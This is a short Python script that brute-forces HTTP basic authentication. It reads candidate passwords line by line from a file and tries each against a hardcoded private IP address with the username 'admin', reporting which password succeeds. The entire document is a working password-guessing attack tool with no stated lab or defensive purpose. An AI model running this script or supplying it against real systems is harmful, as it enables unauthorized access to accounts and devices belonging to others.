#!/usr/bin/env python
import requests
url = "192.168.1.117"
username = "admin"


with open("pass.txt", "r") as passwords:
    for password in passwords:
        password = password.rstrip()
        print("[*] Trying password: {}".format(password))
        r = requests.get("http://{}:{}@{}".format(username, password, url))
        if r.status_code is requests.codes.ok:
            print("[+] Match found: {}".format(password))
        else:
            print("[-] Did not match: {}".format(password))

    
